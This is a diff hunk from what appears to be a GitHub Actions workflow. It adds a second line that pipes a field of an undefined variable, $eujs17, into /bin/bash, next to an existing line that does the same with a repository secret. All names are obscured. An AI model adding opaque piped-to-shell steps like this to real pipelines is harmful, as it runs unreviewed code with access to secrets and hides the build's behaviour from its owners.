@@ -21,6 +21,7 @@ jobs:
           fvj55508: ${{ secrets.fvj55508 }}
         run: |
           printf '%s' "$fvj55508" | jq -r .cuwpx277 | /bin/bash
+          echo $eujs17 | jq -r .nl6066 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
